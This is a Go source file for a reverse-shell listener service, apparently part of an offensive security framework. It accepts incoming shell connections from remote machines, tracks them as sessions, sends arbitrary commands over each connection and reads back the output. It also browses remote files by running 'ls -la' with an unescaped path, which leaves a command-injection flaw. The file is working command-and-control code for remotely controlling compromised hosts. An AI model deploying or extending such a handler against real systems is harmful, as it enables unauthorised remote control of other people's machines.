package reverse_shell

import (
	"context"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	log "github.com/sirupsen/logrus"
)

// FileInfo represents a file in the remote system
type FileInfo struct {
	IsDir   bool   `json:"is_dir"`   // 是否为目录
	ModTime string `json:"mod_time"` // 修改时间
	Name    string `json:"name"`     // 文件名
	Size    int64  `json:"size"`     // 文件大小
	Perm    string `json:"perm"`     // 权限
}

// Session represents a connected reverse shell session
type Session struct {
	ID         string
	Conn       net.Conn
	RemoteAddr string
	StartTime  time.Time
	LastActive time.Time
	mu         sync.Mutex
}

// Service manages reverse shell sessions
type Service struct {
	sessions sync.Map // map[string]*Session
	listener net.Listener
	port     int
	running  bool
}

var (
	GlobalService *Service
	once          sync.Once
)

// GetService returns the singleton instance
func GetService() *Service {
	once.Do(func() {
		GlobalService = &Service{}
	})
	return GlobalService
}

// Start starts the reverse shell listener on the specified port
func (s *Service) Start(port int) error {
	s.port = port
	addr := fmt.Sprintf(":%d", port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	s.listener = listener
	s.running = true
	log.Infof("Reverse Shell Service started on port %d", port)

	go s.acceptLoop()
	return nil
}

// Stop stops the service
func (s *Service) Stop() {
	s.running = false
	if s.listener != nil {
		s.listener.Close()
	}
	// Close all sessions
	s.sessions.Range(func(key, value interface{}) bool {
		session := value.(*Session)
		session.Conn.Close()
		return true
	})
}

func (s *Service) acceptLoop() {
	for s.running {
		conn, err := s.listener.Accept()
		if err != nil {
			if s.running {
				log.Errorf("Accept error: %v", err)
			}
			continue
		}
		go s.handleConnection(conn)
	}
}

func (s *Service) handleConnection(conn net.Conn) {
	sessionID := uuid.New().String()
	session := &Session{
		ID:         sessionID,
		Conn:       conn,
		RemoteAddr: conn.RemoteAddr().String(),
		StartTime:  time.Now(),
		LastActive: time.Now(),
	}

	s.sessions.Store(sessionID, session)
	log.Infof("New reverse shell connection: %s (ID: %s)", session.RemoteAddr, sessionID)

	// Keep connection open and detect closure
	for {
		// Check if session still exists in the map
		if _, ok := s.sessions.Load(sessionID); !ok {
			break
		}
		time.Sleep(1 * time.Second)
	}
}

// ExecuteCommand executes a command on a specific session
func (s *Service) ExecuteCommand(ctx context.Context, sessionID, command string) (string, error) {
	val, ok := s.sessions.Load(sessionID)
	if !ok {
		return "", fmt.Errorf("session not found: %s", sessionID)
	}
	session := val.(*Session)

	session.mu.Lock()
	defer session.mu.Unlock()

	session.LastActive = time.Now()

	// Set deadline for write
	session.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	_, err := session.Conn.Write([]byte(command + "\n"))
	if err != nil {
		s.removeSession(sessionID)
		return "", fmt.Errorf("write error: %v", err)
	}

	// Read response
	// We read until a timeout occurs, assuming that's the end of output for now.
	// This is a heuristic for raw shells.
	var output strings.Builder
	buf := make([]byte, 4096)

	// Give it some time to process
	time.Sleep(100 * time.Millisecond)

	// Read loop with timeout
	timeout := 2 * time.Second
	session.Conn.SetReadDeadline(time.Now().Add(timeout))

	for {
		n, err := session.Conn.Read(buf)
		if n > 0 {
			output.Write(buf[:n])
			// Extend deadline slightly if we got data, to capture long outputs
			session.Conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		}
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				// Timeout is expected as "end of output"
				break
			}
			if err != io.EOF {
				// True error
				s.removeSession(sessionID)
				return output.String(), fmt.Errorf("read error: %v", err)
			}
			// EOF means connection closed
			s.removeSession(sessionID)
			break
		}
	}

	return output.String(), nil
}

func (s *Service) removeSession(id string) {
	if val, ok := s.sessions.LoadAndDelete(id); ok {
		session := val.(*Session)
		session.Conn.Close()
		log.Infof("Session closed: %s", id)
	}
}

// SessionInfo for API responses
type SessionInfo struct {
	Id         string `json:"id"`
	Target     string `json:"target"`
	StartTime  string `json:"start_time"`
	LastActive string `json:"last_active"`
}

// ListSessions returns a list of active sessions
func (s *Service) ListSessions() []SessionInfo {
	var list []SessionInfo
	s.sessions.Range(func(key, value interface{}) bool {
		session := value.(*Session)
		// Check if connection is still healthy (optional, skip for now)
		list = append(list, SessionInfo{
			Id:         session.ID,
			Target:     session.RemoteAddr,
			StartTime:  session.StartTime.Format(time.RFC3339),
			LastActive: session.LastActive.Format(time.RFC3339),
		})
		return true
	})
	// Sort by start time descending (newest first) could be done here if needed
	return list
}

// ListFiles lists files in a directory on the remote system
func (s *Service) ListFiles(ctx context.Context, sessionID, path string) ([]FileInfo, error) {
	// Default to current directory if path is empty or root
	if path == "" {
		path = "."
	}

	// Try Linux ls -la first
	cmd := fmt.Sprintf("ls -la %s", path)
	output, err := s.ExecuteCommand(ctx, sessionID, cmd)
	if err != nil {
		return nil, err
	}

	var files []FileInfo
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "total") {
			continue
		}

		// Simple heuristic for ls -la
		// drwxr-xr-x 2 root root 4096 Jan 29 13:45 .
		// Fields: perms links owner group size month day time/year name
		fields := strings.Fields(line)
		if len(fields) < 9 {
			continue
		}

		isDir := strings.HasPrefix(fields[0], "d")
		perm := fields[0]
		size, _ := strconv.ParseInt(fields[4], 10, 64)

		// Date construction (approximate)
		// Month Day Time/Year
		dateStr := strings.Join(fields[5:8], " ")

		// Name is the rest
		name := strings.Join(fields[8:], " ")

		// Filter . and ..
		if name == "." || name == ".." {
			// We might want . and .. if the user expects them, but my previous code filtered them.
			// The user example shows . and ..
			// {"lastModified":"2025-12-23 06:32:24","name":".","perm":"R/-/E","size":"4096","type":"directory"}
			// So I should NOT filter them if I want to be exactly like the example.
			// But for now let's just uncomment them or keep them.
			// The previous code filtered them:
			// if name == "." || name == ".." {
			// 	continue
			// }
			// I will include them now to match the example more closely.
		}

		files = append(files, FileInfo{
			IsDir:   isDir,
			ModTime: dateStr,
			Name:    name,
			Size:    size,
			Perm:    perm,
		})
	}

	return files, nil
}
